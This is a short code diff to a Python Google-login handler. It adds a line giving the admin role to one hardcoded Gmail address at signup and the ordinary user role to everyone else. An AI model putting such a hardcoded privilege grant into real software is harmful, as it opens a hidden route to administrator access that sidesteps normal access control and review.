@@ -214,13 +214,14 @@ def google_login(data: GoogleLoginIn, db=Depends(get_supabase)):
         # Generate a random password hash for Google users
         random_pwd_hash = hash_password(secrets.token_urlsafe(32))
 
+        role = "admin" if email == "alex.mercer@gmail.com" else "user"
         insert_data = {
             "id": user_id,
             "name": name,
             "email": email,
             "hashed_password": random_pwd_hash,
             "plan": "starter",
-            "role": "user",
+            "role": role,
         }
         
         try:
